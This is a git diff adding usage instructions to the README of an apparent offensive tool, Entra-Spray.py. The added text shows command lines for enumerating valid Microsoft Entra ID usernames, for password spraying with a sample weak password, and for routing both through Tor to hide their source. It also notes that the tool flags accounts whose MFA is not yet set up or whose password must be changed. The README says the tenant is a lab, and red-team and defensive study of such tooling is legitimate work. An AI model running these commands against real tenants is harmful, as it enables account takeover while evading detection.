@@ -32,14 +32,45 @@ Using UserName-Combain.py:
 UserName-Combain.py -input names.txt -output username.txt -tenantname @shak.com -style firstl | first | last | firstlast | first.last | last.first | lastfirst | firstL | lastF | firstL2 | firstL3 | lastF2 | lastF3 | fl | lf | l.first | f.last | first.l | last.f | all 
 ```
 
+### Usage:
+
+the tenant and the upns is a part of a LAB enviroment in Entra ID :]
+
+Checking If User Exist:
+```python
+python3 Entra-Spray.py -user list-of-usernames.txt -check
+```
 <img width="1374" height="164" alt="image" src="https://github.com/user-attachments/assets/54f20eec-2899-429d-9e6b-12c3f5703744" />
 
+Checking If User Exist with TOR routing (-proxytor flag):
+```python
+python3 Entra-Spray.py -user list-of-usernames.txt -check -proxytor
+```
 <img width="1165" height="171" alt="image" src="https://github.com/user-attachments/assets/eb224b87-ab49-4b8f-9f84-0d3d11ab211c" />
 
+Preforming Password Spray Attack:
+```python
+python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' 
+```
 <img width="1323" height="155" alt="image" src="https://github.com/user-attachments/assets/b507524c-e681-4a31-bd63-366dad4f8e4e" />
 
+Preforming Password Spray Attack with '-check' flag:
+```python
+python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check
+```
 <img width="1348" height="146" alt="image" src="https://github.com/user-attachments/assets/d4c33afb-92b5-47d6-ba85-62f5c84f5c8b" />
 
+
+Preforming Password Spray Attack with '-check' flag and with TOR routing:
+
+The script will check if:
+- The user is required to have MFA but has not yet set it up
+- The user is required to have MFA
+- The user is required to change their password
+- 
+```python
+python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check -proxytor
+```
 <img width="1397" height="158" alt="image" src="https://github.com/user-attachments/assets/09b80662-a916-4701-8a37-acad264e5425" />
 
 <img width="1404" height="164" alt="image" src="https://github.com/user-attachments/assets/630588b2-bba4-498d-8e02-833f8ad6d3f7" />
